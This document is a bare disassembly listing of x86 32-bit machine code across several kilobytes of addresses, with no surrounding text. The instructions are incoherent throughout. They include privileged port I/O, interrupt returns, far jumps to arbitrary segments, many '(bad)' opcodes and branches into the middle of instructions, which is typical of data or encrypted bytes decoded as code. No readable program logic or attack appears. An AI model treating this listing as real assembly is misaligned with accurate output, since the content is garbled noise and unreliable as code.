  410ac1:	mov    cl,0xbe
  410ac3:	in     eax,0x8b
  410ac5:	jp     0x410b1b
  410ac7:	imul   edi,DWORD PTR [edi-0x4ae07cfd],0xffffffbf
  410ace:	rep stos DWORD PTR es:[edi],eax
  410ad0:	nop
  410ad1:	cwde   
  410ad2:	fisubr DWORD PTR [eax-0x3e553dce]
  410ad8:	adc    DWORD PTR [ebx*1+0x33173f33],0xe
  410ae0:	push   esp
  410ae1:	xchg   ebx,eax
  410ae2:	mov    esi,0xdce0ef76
  410ae7:	cs xchg esp,eax
  410ae9:	mov    ecx,0xe3a5dc5c
  410aee:	daa    
  410aef:	stos   BYTE PTR es:[edi],al
  410af0:	inc    ebp
  410af1:	out    dx,al
  410af2:	(bad)  
  410af3:	out    0x98,al
  410af5:	jge    0x410ac8
  410af7:	push   esi
  410af8:	inc    edi
  410af9:	test   DWORD PTR fs:[edx-0x49],eax
  410afd:	and    BYTE PTR [esi+0x309a3904],0xc4
  410b04:	mov    eax,0x56da2eb
  410b09:	xor    BYTE PTR [edi-0x58],0xa6
  410b0d:	pop    ebp
  410b0e:	out    0x52,al
  410b10:	jne    0x410ad4
  410b12:	adc    BYTE PTR [ebp-0x4b22b368],dh
  410b18:	inc    ecx
  410b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b1a:	iret   
  410b1b:	mov    ah,0xa
  410b1d:	sahf   
  410b1e:	sti    
  410b1f:	push   edx
  410b20:	mov    al,ds:0xe6447ff9
  410b25:	push   ebp
  410b26:	adc    edi,DWORD PTR ds:0x91b21819
  410b2c:	inc    ecx
  410b2d:	jmp    0xe94851ad
  410b32:	push   ebp
  410b33:	int3   
  410b34:	jl     0x410b89
  410b36:	out    0x49,al
  410b38:	clc    
  410b39:	in     eax,dx
  410b3a:	or     eax,0x94e2c58a
  410b3f:	out    dx,al
  410b40:	scas   al,BYTE PTR es:[edi]
  410b41:	sbb    al,0x7
  410b43:	inc    edx
  410b44:	in     eax,0x4
  410b46:	cmp    BYTE PTR [ecx+0x5a],al
  410b49:	lock addr16 mov cl,0x69
  410b4d:	sahf   
  410b4e:	jns    0x410ad1
  410b50:	call   0x4dbf1ec7
  410b55:	adc    al,0x6c
  410b57:	pop    ebx
  410b58:	jmp    0x410bb0
  410b5a:	mov    dl,0xdb
  410b5c:	stc    
  410b5d:	or     ah,BYTE PTR [ebx+0x1f269986]
  410b63:	add    BYTE PTR [ebp+0x1],dl
  410b66:	outs   dx,BYTE PTR ds:[esi]
  410b67:	test   al,0x56
  410b69:	push   ss
  410b6a:	popa   
  410b6b:	and    dh,ch
  410b6d:	or     DWORD PTR [ecx],0xe50fe583
  410b73:	dec    esi
  410b74:	mov    ecx,0x9f0a2578
  410b79:	rcr    DWORD PTR [ebp+0x3e],cl
  410b7c:	pop    es
  410b7d:	xchg   esp,eax
  410b7e:	jg     0x410bae
  410b80:	test   eax,0x5aaaf32a
  410b85:	cwde   
  410b86:	cmp    BYTE PTR [esi+0x7e8b1e48],ah
  410b8c:	loope  0x410b27
  410b8e:	lea    esp,[esp+edx*2+0x59146cb5]
  410b95:	xchg   edi,eax
  410b96:	rol    BYTE PTR [ebx+0x68],1
  410b99:	jae    0x410bde
  410b9b:	ins    DWORD PTR es:[edi],dx
  410b9c:	imul   edi,esi,0x576db7f6
  410ba2:	add    DWORD PTR [edi-0x197303b2],edx
  410ba8:	push   cs
  410ba9:	add    dh,BYTE PTR ds:0x7bc3d450
  410baf:	nop
  410bb0:	fild   QWORD PTR [eax]
  410bb2:	aaa    
  410bb3:	pop    es
  410bb4:	push   eax
  410bb5:	lods   al,BYTE PTR ds:[esi]
  410bb6:	fs rol ebp,0x88
  410bba:	sti    
  410bbb:	mov    al,0x6c
  410bbd:	xor    esp,DWORD PTR [esi+0x10]
  410bc0:	lahf   
  410bc1:	jns    0x410b61
  410bc3:	std    
  410bc4:	dec    ebx
  410bc5:	lods   al,BYTE PTR ds:[esi]
  410bc6:	or     ecx,DWORD PTR [edx-0x4ae9931c]
  410bcc:	push   cs
  410bcd:	test   eax,0x920e724f
  410bd2:	rol    BYTE PTR [ecx-0x3adc750b],cl
  410bd8:	mov    al,0x3a
  410bda:	add    eax,0x2261a816
  410bdf:	pop    ebp
  410be0:	jne    0x410c5f
  410be2:	ffree  st(7)
  410be4:	push   esp
  410be5:	dec    ecx
  410be6:	jb     0x410c49
  410be8:	xor    esp,DWORD PTR [ebx+0x72cda09a]
  410bee:	or     eax,0xdfb4ec3b
  410bf3:	outs   dx,BYTE PTR ds:[esi]
  410bf4:	test   eax,0x9d5d6e24
  410bf9:	stos   BYTE PTR es:[edi],al
  410bfa:	mov    dh,0xca
  410bfc:	adc    BYTE PTR [esi+ebp*8-0x63],ah
  410c00:	mov    dh,0xce
  410c02:	fnstcw WORD PTR [edi+ebp*4+0x28d6af9a]
  410c09:	addr16 mov ds:0xff06,eax
  410c0d:	dec    edx
  410c0e:	pop    ebp
  410c0f:	pop    ecx
  410c10:	xor    BYTE PTR [eax],bl
  410c12:	push   ebp
  410c13:	inc    ebx
  410c14:	cmc    
  410c15:	lea    ecx,[ebx]
  410c17:	adc    DWORD PTR [ebx+0x48312361],ecx
  410c1d:	xchg   DWORD PTR [ebp-0x719fdd2],edx
  410c23:	daa    
  410c24:	mov    dh,0x47
  410c26:	sub    al,0x49
  410c28:	mov    bl,0x64
  410c2a:	xor    dl,bh
  410c2c:	mov    bh,0x78
  410c2e:	dec    ebx
  410c2f:	repz mov al,0xf0
  410c32:	sbb    BYTE PTR [ebx+0x56],dl
  410c35:	mov    ebx,0x8d5177e9
  410c3a:	lock adc DWORD PTR [edi-0x79],eax
  410c3e:	inc    edi
  410c3f:	and    al,BYTE PTR [edi]
  410c41:	into   
  410c42:	aam    0x42
  410c44:	pop    edx
  410c45:	loop   0x410bd4
  410c47:	xchg   DWORD PTR [edi],esp
  410c49:	push   ds
  410c4a:	jb     0x410bf8
  410c4c:	aam    0xdd
  410c4e:	ret    0xc3b3
  410c51:	jmp    0x410c12
  410c53:	cld    
  410c54:	mov    ebx,0x562f69fb
  410c59:	in     al,0xaa
  410c5b:	xor    dl,BYTE PTR [ecx+ecx*8]
  410c5e:	mov    dh,0x9
  410c60:	sbb    DWORD PTR [edx],edx
  410c62:	sub    ebp,DWORD PTR [ebx+0x702ba6a9]
  410c68:	push   eax
  410c69:	imul   esp,DWORD PTR [eax],0x9
  410c6c:	lods   al,BYTE PTR ds:[esi]
  410c6d:	mov    al,0x34
  410c6f:	leave  
  410c70:	hlt    
  410c71:	jb     0x410c0a
  410c73:	xchg   BYTE PTR [edx-0x11713954],dl
  410c79:	stos   DWORD PTR es:[edi],eax
  410c7a:	in     eax,0xdb
  410c7c:	mov    ecx,0xbf8d9585
  410c81:	push   ds
  410c82:	dec    eax
  410c83:	pop    eax
  410c84:	xchg   esi,eax
  410c85:	and    BYTE PTR [eax+ebx*2+0x17],dl
  410c89:	mov    BYTE PTR [bp+di],0x4e
  410c8d:	aaa    
  410c8e:	push   edx
  410c8f:	jbe    0x410c92
  410c91:	fnstcw WORD PTR [esi-0x47df5fb3]
  410c97:	mov    ds:0xcf63c4ba,eax
  410c9c:	test   eax,0x3e3adc87
  410ca1:	lods   al,BYTE PTR ds:[esi]
  410ca2:	inc    eax
  410ca3:	fsub   st(2),st
  410ca5:	xor    al,0xaa
  410ca7:	push   ss
  410ca8:	xchg   ebx,eax
  410ca9:	mov    edi,0x7d27e53d
  410cae:	fild   QWORD PTR [esi]
  410cb0:	lods   al,BYTE PTR ds:[esi]
  410cb1:	mov    ebx,0xd49b600a
  410cb6:	inc    ecx
  410cb7:	jle    0x410c41
  410cb9:	pop    ecx
  410cba:	add    BYTE PTR [eax-0x75276174],dh
  410cc0:	adc    al,0x92
  410cc2:	vpunpcklbw ymm1,ymm1,YMMWORD PTR [edi+0x7e]
  410cc7:	js     0x410c4f
  410cc9:	inc    ecx
  410cca:	sbb    eax,0xd7e7e4e1
  410ccf:	and    edx,DWORD PTR [edx]
  410cd1:	cmp    DWORD PTR [ecx+0x4d],0xffffffca
  410cd5:	push   ds
  410cd6:	cmp    BYTE PTR [edi+edx*4-0x7945876a],cl
  410cdd:	popa   
  410cde:	mov    edx,0x277da369
  410ce3:	mov    dh,0x87
  410ce5:	jae    0x410cca
  410ce7:	daa    
  410ce8:	xchg   edx,eax
  410ce9:	loop   0x410cdb
  410ceb:	and    edx,DWORD PTR [esi-0x60dd0168]
  410cf1:	push   cs
  410cf2:	lods   al,BYTE PTR ds:[esi]
  410cf3:	fs cdq 
  410cf5:	fstp   TBYTE PTR [ecx-0xb5e98db]
  410cfb:	jg     0x410d29
  410cfd:	nop
  410cfe:	inc    eax
  410cff:	jbe    0x410d80
  410d01:	arpl   WORD PTR [eax+0x35e26ac2],di
  410d07:	adc    esp,DWORD PTR [ebx-0x3379734]
  410d0d:	loop   0x410d19
  410d0f:	xor    edi,esp
  410d11:	or     DWORD PTR [esi],ebx
  410d13:	adc    ch,BYTE PTR [ebp-0xd]
  410d16:	jne    0x410d1f
  410d18:	xchg   edx,eax
  410d19:	(bad)
  410d1e:	aas    
  410d1f:	inc    ebx
  410d20:	mov    bh,0xaf
  410d22:	jmp    0x410d5f
  410d24:	add    bl,BYTE PTR [ebx]
  410d26:	pop    ecx
  410d27:	ss pop ds
  410d29:	pop    ebp
  410d2a:	adc    esp,DWORD PTR [eax-0x17]
  410d2d:	scas   al,BYTE PTR es:[edi]
  410d2e:	(bad)  
  410d2f:	or     al,0xee
  410d31:	jp     0x410cc5
  410d33:	outs   dx,BYTE PTR ds:[esi]
  410d34:	idiv   cl
  410d36:	call   0x1414e822
  410d3b:	push   0x37
  410d3d:	add    DWORD PTR [ecx],0x46558de
  410d43:	sub    eax,0x61ca8f3a
  410d48:	push   esi
  410d49:	call   0x19b8:0xdb074b6
  410d50:	jbe    0x410d85
  410d52:	imul   eax,DWORD PTR [ebx],0x23
  410d55:	push   eax
  410d56:	icebp  
  410d57:	int    0x68
  410d59:	sbb    BYTE PTR [ebx+0x44e85170],dh
  410d5f:	mov    dl,0x15
  410d61:	fwait
  410d62:	pop    esp
  410d63:	sub    ebp,edx
  410d65:	cs cmp bh,cl
  410d68:	jmp    0x410d7e
  410d6a:	xor    BYTE PTR [ebx],ch
  410d6c:	mov    dh,0xba
  410d6e:	aad    0x92
  410d70:	xchg   ebp,eax
  410d71:	in     eax,0x5b
  410d73:	and    BYTE PTR [edi+eax*1-0x25],0xe6
  410d78:	loope  0x410d28
  410d7a:	pop    edx
  410d7b:	mov    WORD PTR [edx],?
  410d7d:	into   
  410d7e:	xchg   edx,eax
  410d7f:	fs dec ebp
  410d82:	ss xchg esi,eax
  410d84:	xor    DWORD PTR [edi-0x35c942cf],ebp
  410d8a:	inc    ecx
  410d8b:	out    0xd2,al
  410d8d:	xchg   ah,dl
  410d8f:	in     al,dx
  410d90:	sbb    bh,al
  410d92:	inc    eax
  410d93:	mov    eax,0xa36fe51c
  410d98:	sbb    eax,DWORD PTR [ebx-0x5b]
  410d9b:	pop    edx
  410d9c:	adc    BYTE PTR [edi],bh
  410d9e:	push   0x38e64679
  410da3:	jp     0x410d27
  410da5:	sbb    DWORD PTR [edi-0x1c04bc78],ebx
  410dab:	test   BYTE PTR [edx+0x1c],0x31
  410daf:	cmp    DWORD PTR [eax],0x74314c2d
  410db5:	pop    edi
  410db6:	xor    eax,DWORD PTR ds:0x75a1dfa9
  410dbc:	adc    BYTE PTR [ecx-0x44febe5],dh
  410dc2:	jmp    0x3a21:0xa66db6b7
  410dc9:	lods   al,BYTE PTR ds:[esi]
  410dca:	ins    BYTE PTR es:[edi],dx
  410dcb:	push   edi
  410dcc:	sub    BYTE PTR [ebx-0x17],bh
  410dcf:	ret    
  410dd0:	hlt    
  410dd1:	in     al,dx
  410dd2:	mov    eax,ds:0x7873c4fa
  410dd7:	and    ah,BYTE PTR [ebp+0x5b]
  410dda:	pop    ds
  410ddb:	gs inc esp
  410ddd:	jmp    0x410d9e
  410ddf:	int    0x4c
  410de1:	add    BYTE PTR [ecx],bh
  410de3:	addr16 dec edi
  410de5:	jmp    0x410de3
  410de7:	add    eax,0xd594cf
  410dec:	cmp    DWORD PTR [edi],eax
  410dee:	ins    DWORD PTR es:[edi],dx
  410def:	rcl    bl,1
  410df1:	mov    ecx,0xf6cdf8db
  410df6:	mov    dh,0x5b
  410df8:	pop    edx
  410df9:	and    al,0x9e
  410dfb:	inc    esp
  410dfc:	push   edx
  410dfd:	jge    0x410dd7
  410dff:	shl    DWORD PTR ds:0x5f95a070,cl
  410e05:	push   ecx
  410e06:	call   0xc409:0xf9ceb13f
  410e0d:	out    0x41,al
  410e0f:	lds    ebp,FWORD PTR [ecx-0x54]
  410e12:	lahf   
  410e13:	mov    cl,ah
  410e15:	pop    esi
  410e16:	jmp    0xd6c8fdfb
  410e1b:	and    esi,DWORD PTR [ebx-0x3bfa4f7b]
  410e21:	fsub   st(4),st
  410e23:	mov    BYTE PTR [ebx-0x3b],bl
  410e26:	shr    DWORD PTR [ebp-0x8a8d707],cl
  410e2c:	push   ss
  410e2d:	jns    0x410e63
  410e2f:	mov    esp,0x3d80f828
  410e34:	mov    esi,0x3df78157
  410e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e3a:	ja     0x410e57
  410e3c:	adc    ecx,edx
  410e3e:	inc    esp
  410e3f:	mov    ch,0x52
  410e41:	sar    DWORD PTR [ecx-0x6e3b7569],cl
  410e47:	(bad)  
  410e48:	loopne 0x410e58
  410e4a:	lods   eax,DWORD PTR ds:[esi]
  410e4b:	push   ds
  410e4c:	pop    ebp
  410e4d:	std    
  410e4e:	jmp    0x6c26:0xd2b773db
  410e55:	ins    DWORD PTR es:[edi],dx
  410e56:	sub    eax,0x460811c2
  410e5b:	es fwait
  410e5d:	inc    ecx
  410e5e:	or     DWORD PTR [esi+0x48323d8e],eax
  410e64:	sub    cl,BYTE PTR [ebp+0x6af73ac6]
  410e6a:	jo     0x410e38
  410e6c:	push   0xffffffe8
  410e6e:	cmp    BYTE PTR [eax-0x6826305f],ah
  410e74:	xor    edi,ebp
  410e76:	test   al,0x61
  410e78:	sub    bh,bh
  410e7a:	out    dx,eax
  410e7b:	jecxz  0x410ed5
  410e7d:	shl    DWORD PTR [edi-0x2ede4894],0x40
  410e84:	mov    esp,DWORD PTR [esi+edi*8]
  410e87:	mov    esp,0x87866298
  410e8c:	push   edi
  410e8d:	ins    DWORD PTR es:[edi],dx
  410e8e:	lds    ebx,FWORD PTR [edi-0x38]
  410e91:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410e93:	xchg   BYTE PTR [esi+ecx*4],bl
  410e96:	aad    0xa8
  410e98:	jne    0x410efe
  410e9a:	mov    cl,0x5b
  410e9c:	pushf  
  410e9d:	pop    esp
  410e9e:	add    BYTE PTR [eax],ah
  410ea0:	pop    ebx
  410ea1:	jns    0x410e7f
  410ea3:	sbb    eax,0xdbd4de2e
  410ea8:	dec    eax
  410ea9:	bound  ecx,QWORD PTR [eax-0x11]
  410eac:	test   BYTE PTR [edx-0x526cb502],ch
  410eb2:	xchg   ebx,eax
  410eb3:	jb     0x410ece
  410eb5:	push   es
  410eb6:	scas   al,BYTE PTR es:[edi]
  410eb7:	mov    ds:0xc1c1eecd,eax
  410ebc:	dec    esp
  410ebd:	add    al,0x45
  410ebf:	popf   
  410ec0:	inc    esp
  410ec1:	push   0xffffffd0
  410ec3:	dec    edx
  410ec4:	pushf  
  410ec5:	dec    edi
  410ec6:	or     esp,DWORD PTR [eax-0x76]
  410ec9:	mov    esi,0x40c52a95
  410ece:	das    
  410ecf:	jo     0x410ed5
  410ed1:	adc    DWORD PTR [ecx-0x60],0xffffffe1
  410ed5:	mov    BYTE PTR [ebx-0x50],dh
  410ed8:	stos   DWORD PTR es:[edi],eax
  410ed9:	push   edi
  410eda:	pop    ebx
  410edb:	sub    bh,BYTE PTR [eax+0x657deb9a]
  410ee1:	jo     0x410f20
  410ee3:	int3   
  410ee4:	ins    DWORD PTR es:[edi],dx
  410ee5:	clc    
  410ee6:	and    edi,DWORD PTR ds:0x6099ff64
  410eec:	fnstsw WORD PTR ds:0xc013f106
  410ef2:	test   al,0x6b
  410ef4:	jmp    0x1416:0x796340b8
  410efb:	test   al,0x6f
  410efd:	and    eax,0x8819e622
  410f02:	sbb    edx,edi
  410f04:	aas    
  410f05:	sbb    ebx,DWORD PTR [ecx+0x7f2ab55c]
  410f0b:	push   edi
  410f0c:	xor    DWORD PTR [ebx],ecx
  410f0e:	xchg   edi,eax
  410f0f:	push   eax
  410f10:	push   edx
  410f11:	fld    QWORD PTR [ebx-0x22171ad0]
  410f17:	stos   BYTE PTR es:[edi],al
  410f18:	dec    edx
  410f19:	inc    ebx
  410f1a:	in     eax,dx
  410f1b:	dec    ebp
  410f1c:	push   ebp
  410f1d:	pop    ss
  410f1e:	push   eax
  410f1f:	fdiv   QWORD PTR [edi-0x2b]
  410f22:	cdq    
  410f23:	popa   
  410f24:	adc    eax,0xcd6cc7e8
  410f29:	sub    cl,BYTE PTR [edx]
  410f2b:	dec    ecx
  410f2c:	mov    bh,0x8
  410f2e:	lods   al,BYTE PTR ds:[esi]
  410f2f:	repz mov bh,BYTE PTR [eax]
  410f32:	push   ss
  410f33:	ds sub eax,0x56aae9dd
  410f39:	pop    ecx
  410f3a:	fs addr16 (bad) 
  410f3d:	aaa    
  410f3e:	iret   
  410f3f:	dec    ebp
  410f40:	dec    esp
  410f41:	push   cs
  410f42:	push   0xfffffffb
  410f44:	push   ds
  410f45:	dec    edx
  410f46:	jmp    0x3bec:0xdf85ad26
  410f4d:	mov    ah,0x12
  410f4f:	imul   ebx,DWORD PTR gs:[ebp+0x7b45ff82],0x618c3b8d
  410f5a:	sahf   
  410f5b:	rcl    BYTE PTR [eax+0x20],0xb2
  410f5f:	(bad)  
  410f60:	sbb    DWORD PTR [esi-0x17],eax
  410f63:	inc    ebp
  410f64:	cmp    dh,BYTE PTR [edi+0x4f8af2ea]
  410f6a:	(bad)  
  410f6b:	cs xchg esp,eax
  410f6d:	cmp    BYTE PTR [ebx-0x66],0x5
  410f71:	and    esp,DWORD PTR [edi+0x3af54455]
  410f77:	ja     0x410f5f
  410f79:	icebp  
  410f7a:	addr16 mov bh,0x2
  410f7d:	cwde   
  410f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7f:	cmp    ebp,DWORD PTR [eax+edx*1]
  410f82:	xchg   eax,esp
  410f84:	dec    edx
  410f85:	sbb    DWORD PTR [ebp+ebx*4-0x7b276624],ebx
  410f8c:	loop   0x410f43
  410f8e:	mov    ebp,0x6dff5dc8
  410f93:	mov    bl,0xc3
  410f95:	adc    ecx,DWORD PTR [edi]
  410f97:	sub    ebx,esi
  410f99:	xor    al,0x4b
  410f9b:	fsubr  st,st(7)
  410f9d:	sar    DWORD PTR [edx+eiz*4],1
  410fa0:	ror    BYTE PTR [ecx+0x778f82f5],1
  410fa6:	and    ah,cl
  410fa8:	ins    DWORD PTR es:[edi],dx
  410fa9:	pop    edi
  410faa:	push   ebx
  410fab:	out    dx,eax
  410fac:	sub    esp,DWORD PTR [ebx]
  410fae:	sbb    DWORD PTR [ecx+ebx*8+0x0],esi
  410fb2:	mov    dl,0x2d
  410fb4:	lahf   
  410fb5:	scas   al,BYTE PTR es:[edi]
  410fb6:	mov    ah,0x2
  410fb8:	fucom  st(4)
  410fba:	popa   
  410fbb:	adc    eax,0xa839c629
  410fc0:	ja     0x410f6f
  410fc2:	stc    
  410fc3:	inc    edi
  410fc4:	jb     0x410f86
  410fc6:	int3   
  410fc7:	pop    ds
  410fc8:	pop    esi
  410fc9:	fiadd  DWORD PTR [ecx+0x2f]
  410fcc:	data16 add dh,BYTE PTR cs:[edx+0x1]
  410fd1:	sbb    edi,0xf104f2a7
  410fd7:	shr    BYTE PTR [edi+0x37],cl
  410fda:	in     eax,dx
  410fdb:	sbb    esi,DWORD PTR [eax+0x2f]
  410fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fdf:	ja     0x410fa2
  410fe1:	xchg   edx,eax
  410fe2:	and    esi,ecx
  410fe4:	clc    
  410fe5:	cmp    cl,BYTE PTR [edi-0x60ffc64]
  410feb:	mov    ch,0x6b
  410fed:	cli    
  410fee:	cmp    BYTE PTR [esi-0x48],dh
  410ff1:	add    eax,0x826682e5
  410ff6:	aam    0xb2
  410ff8:	shl    BYTE PTR [ebx-0x3a],cl
  410ffb:	push   ss
  410ffc:	(bad)  
  410ffd:	mov    bh,BYTE PTR [ebx+0x5dcd2da4]
  411003:	jmp    0x410fa8
  411005:	outs   dx,DWORD PTR ds:[esi]
  411006:	cwde   
  411007:	push   es
  411008:	icebp  
  411009:	pop    es
  41100a:	push   cs
  41100b:	add    al,0xf6
  41100d:	or     bl,ah
  41100f:	and    dl,BYTE PTR [esi+0x7d]
  411012:	jl     0x411058
  411014:	call   0x2f1ac528
  411019:	(bad)  
  41101a:	ds je  0x411039
  41101d:	pop    edi
  41101e:	outs   dx,DWORD PTR ds:[esi]
  41101f:	jo     0x411091
  411021:	xchg   esi,eax
  411022:	dec    ecx
  411023:	lds    edx,FWORD PTR [esi-0x4d]
  411026:	mov    eax,ds:0x229f2447
  41102b:	test   eax,0x600aa0ba
  411030:	push   cs
  411031:	push   edx
  411032:	clc    
  411033:	pop    edi
  411034:	fistp  QWORD PTR [ecx-0x5e1d9590]
  41103a:	shl    BYTE PTR [ebp+0xb],1
  41103d:	sbb    al,0x20
  41103f:	je     0x410fc8
  411041:	cwde   
  411042:	mov    al,0x45
  411044:	aaa    
  411045:	fistp  DWORD PTR [esi+0x5c]
  411048:	sub    eax,0x425f7933
  41104d:	popf   
  41104e:	repz cmp BYTE PTR [edi+ebp*4+0x30e48ed0],ch
  411056:	adc    ecx,DWORD PTR [ebx+eiz*4]
  411059:	inc    eax
  41105a:	jb     0x41108a
  41105c:	lods   eax,DWORD PTR ds:[esi]
  41105d:	push   ebx
  41105e:	frstor fs:[ebx+0x1a460fb5]
  411065:	jb     0x411082
  411067:	xchg   edx,eax
  411068:	into   
  411069:	popf   
  41106a:	or     BYTE PTR [edi+0x69],ch
  41106d:	imul   ecx,DWORD PTR [edi],0xb29bcd62
  411073:	stos   BYTE PTR es:[edi],al
  411074:	pop    edi
  411075:	jbe    0x41106e
  411077:	push   eax
  411078:	repz into 
  41107a:	int    0x27
  41107c:	ret    0x7e34
  41107f:	or     eax,0x11fd0405
  411084:	xor    esi,DWORD PTR ds:0xdfe50cc6
  41108a:	push   ds
  41108b:	dec    eax
  41108c:	cs pop esi
  41108e:	sbb    ebx,esi
  411090:	cld    
  411091:	add    al,0xc2
  411093:	ins    BYTE PTR es:[edi],dx
  411094:	mov    edx,0x256265b3
  411099:	test   DWORD PTR [ebp-0xb],esp
  41109c:	mov    eax,0x7c5cd9f9
  4110a1:	push   esi
  4110a2:	sub    BYTE PTR [esi-0x2e],al
  4110a5:	push   edi
  4110a6:	xchg   ebp,eax
  4110a7:	sub    ecx,esi
  4110a9:	stc    
  4110aa:	(bad)  
  4110ab:	rcr    bl,0xe1
  4110ae:	imul   ebp,ebp,0x4f
  4110b1:	sub    ah,bl
  4110b3:	inc    edi
  4110b4:	cmc    
  4110b5:	adc    ebp,DWORD PTR [ecx-0x781cd827]
  4110bb:	sub    al,ah
  4110bd:	dec    ebx
  4110be:	xor    eax,0xc4e3f3a0
  4110c3:	jmp    0x6870:0x4c1433ce
  4110ca:	dec    ebx
  4110cb:	fs or  eax,0xdb7529e7
  4110d1:	mov    dh,0x11
  4110d3:	inc    eax
  4110d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d5:	cmp    BYTE PTR [ebx],ch
  4110d7:	push   edi
  4110d8:	mov    ebx,0xb3a889d
  4110dd:	inc    edi
  4110de:	dec    ebp
  4110df:	add    DWORD PTR [edx-0x27],eax
  4110e2:	xor    ch,BYTE PTR [edi]
  4110e4:	repz les esi,FWORD PTR [edx]
  4110e7:	inc    esi
  4110e8:	dec    esp
  4110e9:	mov    WORD PTR [edi-0x77],cs
  4110ec:	jg     0x4110ef
  4110ee:	jl     0x411161
  4110f0:	jae    0x4110e9
  4110f2:	push   ebx
  4110f3:	xchg   edx,eax
  4110f4:	leave  
  4110f5:	fmul   DWORD PTR [edi+0x1b]
  4110f8:	mov    dl,0x7e
  4110fa:	stc    
  4110fb:	add    DWORD PTR [edx+ebp*8+0x4d79f9a9],ebp
  411102:	jns    0x411162
  411104:	fmulp  st(1),st
  411106:	push   eax
  411107:	cdq    
  411108:	cmp    al,0x8f
  41110a:	mov    dl,dh
  41110c:	xchg   esi,eax
  41110d:	fcom   DWORD PTR [eax+0x46]
  411110:	(bad)  
  411111:	out    0x73,eax
  411113:	and    al,BYTE PTR [ecx]
  411115:	test   DWORD PTR [ebx],edx
  411117:	(bad)  
  411119:	repz pushf 
  41111b:	aas    
  41111c:	test   DWORD PTR [esi+eax*1],eax
  41111f:	aam    0x5e
  411121:	xor    DWORD PTR [ebp-0x54],0x65c0c86f
  411128:	mov    gs,WORD PTR [edi+0x55da8c25]
  41112e:	jbe    0x411135
  411130:	lods   eax,DWORD PTR ds:[esi]
  411131:	std    
  411132:	pop    ss
  411133:	jle    0x411110
  411135:	sar    BYTE PTR [ecx-0x7f88b11],cl
  41113b:	jns    0x4110e7
  41113d:	xchg   si,ax
  41113f:	cmp    eax,ebp
  411141:	push   esp
  411142:	enter  0x4189,0x8a
  411146:	adc    eax,0xc6083b67
  41114b:	push   ds
  41114c:	popa   
  41114d:	mov    cl,0x39
  41114f:	xor    esp,DWORD PTR ds:0x1338ba4f
  411155:	fdivr  st(1),st
  411157:	mov    ah,0xe1
  411159:	arpl   WORD PTR [ebx-0x14],dx
  41115c:	int3   
  41115d:	or     eax,0x8917a070
  411162:	leave  
  411163:	and    ch,bh
  411165:	(bad)  
  411166:	adc    cl,BYTE PTR [edx+0x79d472f8]
  41116c:	jmp    0x4b8b:0x968b92c7
  411173:	xor    al,0x62
  411175:	fsub   DWORD PTR [edx+0x462d1caf]
  41117b:	aad    0x9
  41117d:	int    0x7b
  41117f:	jb     0x4111ea
  411181:	mov    bh,0xb4
  411183:	or     DWORD PTR [ebx+0x3d],esp
  411186:	xchg   ebx,eax
  411187:	xor    al,0x8
  411189:	aad    0x73
  41118b:	popf   
  41118c:	fimul  DWORD PTR [ecx+0x62e7d1d1]
  411192:	xchg   ebx,eax
  411193:	and    edx,DWORD PTR [edx-0x14]
  411196:	int    0x9f
  411198:	xor    ebx,ebp
  41119a:	pusha  
  41119b:	or     bl,BYTE PTR [edi-0xa]
  41119e:	and    al,0xb3
  4111a0:	loope  0x4111b4
  4111a2:	mov    al,0x6c
  4111a4:	and    BYTE PTR [esi+0x465b416c],ch
  4111aa:	jne    0x41114e
  4111ac:	out    0xc3,al
  4111ae:	addr16 ss xor eax,0x1c06e9ec
  4111b5:	adc    BYTE PTR [ebp-0x447f6a22],ch
  4111bb:	and    al,0x22
  4111bd:	and    bh,0x91
  4111c0:	push   edi
  4111c1:	sub    DWORD PTR [ecx-0x59],esp
  4111c4:	repnz mov ch,0xb6
  4111c7:	call   0xe80c921
  4111cc:	adc    esi,DWORD PTR [esi-0x7f85dcd]
  4111d2:	jp     0x4111dd
  4111d4:	arpl   WORD PTR [edx-0x7e28e515],bp
  4111da:	mov    edx,0xca3280ce
  4111df:	mov    ecx,DWORD PTR [ebx]
  4111e1:	fimul  DWORD PTR [edi-0x20]
  4111e4:	jg     0x411184
  4111e6:	mov    esi,0x86719537
  4111eb:	push   ds
  4111ec:	and    al,0x9c
  4111ee:	mov    dh,0x81
  4111f0:	jle    0x41121d
  4111f2:	sbb    bl,BYTE PTR [edx+0x79]
  4111f5:	sub    BYTE PTR [edi],0x8f
  4111f8:	mov    bl,bl
  4111fa:	pop    es
  4111fb:	fs aad 0xc6
  4111fe:	adc    eax,0xe4a31eaa
  411203:	fidiv  WORD PTR [eax-0x18]
  411206:	xchg   edx,eax
  411207:	(bad)  
  411208:	loope  0x4111d3
  41120a:	fstp   QWORD PTR [bx+0x2007]
  41120f:	nop
  411210:	arpl   WORD PTR [eax-0x356f80d0],di
  411216:	push   es
  411217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411218:	aas    
  411219:	adc    ch,BYTE PTR [edx]
  41121b:	push   0xffffffad
  41121d:	(bad)  
  41121f:	sub    BYTE PTR [eax-0x2f],0x47
  411223:	push   0x67
  411225:	nop
  411226:	repz adc eax,0x901851ed
  41122c:	stc    
  41122d:	sahf   
  41122e:	lock sub ebp,eax
  411231:	push   ebx
  411232:	fld    TBYTE PTR [esi-0x5]
  411235:	aaa    
  411236:	jnp    0x41124d
  411238:	sahf   
  411239:	pop    ebp
  41123a:	xchg   ebx,eax
  41123b:	jne    0x41128b
  41123d:	jno    0x4111e0
  41123f:	mov    esp,0x89f8e241
  411244:	es hlt 
  411246:	retf   
  411247:	xor    al,dh
  411249:	inc    edi
  41124a:	les    ebp,FWORD PTR [edi+0x79]
  41124d:	cli    
  41124e:	mov    edx,0x813f9a57
  411253:	dec    eax
  411254:	pusha  
  411255:	adc    ch,BYTE PTR [ebx+0x23]
  411258:	mov    eax,ds:0x82c6ec4a
  41125d:	loope  0x41127f
  41125f:	(bad)  
  411260:	mov    ecx,0xa5f00210
  411265:	push   ebp
  411266:	call   0x483b:0x588cb97d
  41126d:	sub    esp,DWORD PTR [ebx-0x746fa2b7]
  411273:	xor    esp,edi
  411275:	xchg   edi,eax
  411276:	and    ebp,edi
  411278:	inc    ebx
  411279:	mov    edx,0xf793f7d1
  41127e:	ror    BYTE PTR [eax],0xab
